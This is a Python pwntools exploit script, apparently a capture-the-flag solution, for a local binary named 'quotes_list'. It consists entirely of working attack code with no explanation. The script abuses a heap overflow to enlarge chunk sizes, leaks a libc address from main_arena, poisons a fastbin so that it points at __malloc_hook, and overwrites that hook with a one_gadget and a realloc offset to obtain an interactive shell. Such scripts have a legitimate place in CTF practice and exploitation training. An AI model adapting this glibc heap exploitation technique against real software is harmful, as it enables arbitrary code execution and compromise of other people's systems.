from pwn import *

p = process("./quotes_list")
elf = ELF("./quotes_list")
libc = ELF("/opt/glibc/libc.so.6")

cmd = lambda c : p.sendafter("> " , str(c))

def create(size , content):
	cmd(1)
	p.sendafter("Length: " , str(size))
	p.sendafter("Content: " , content)

def edit(index , content):
	cmd(2)
	p.sendafter("Index: " , str(index))
	p.sendafter("Content: " , content)

def show(index):
	cmd(3)
	p.sendafter("Index: " , str(index))

def free(index):
	cmd(4)
	p.sendafter("Index: " , str(index))

size = 0x3f8
create(0x28 , "a") # 0 # 0x30
create(0x28 , "b") # 1 # 0x30 # to extended to 0x50 # heap overflow
create(size , "c" * 0x10 + p64(0) + p64(0x21)) # check fastbin free # next chunk size
create(0x60 , "d") # consolidate canary
create(0x10 , "e") # free(2) check1 # free(2) check2 is top chunk
edit(1 , "b" * 0x28 + "\x71") 
edit(0 , "a" * 0x28 + "\x51")
free(1)
create(0x40 , "b2")

free(2)
create(size , "c" * 8)
# edit(1 , "b" * 0x)
show(2)
p.recvuntil("c" * 0x8)
main_arena = u64(p.recvuntil("\x7f").ljust(8 , "\x00")) - 0x460
libc.address = main_arena - 0x3aec40 
log.info("libc : " + hex(libc.address))

edit(1 , "b" * 0x28 + p64(0x71))
edit(2 , "b" * 0x60 + p64(0) + p64(20))
free(2)
edit(1 , "b" * 0x28 + p64(0x71) + p64(libc.sym["__malloc_hook"] - 0x23))
log.info("malloc_hook : " + hex(libc.sym["__malloc_hook"]))
log.info("realloc_hook : " + hex(libc.sym["__realloc_hook"]))
one = libc.address + 0xdf741

create(0x60 , "1")
realloc = libc.sym["__GI___libc_realloc"]
create(0x60 , 'a'*0x1b+p64(one)+p64(realloc+6))

free(0)
cmd(1)
p.sendafter("Length: " , str(0x40))
p.interactive()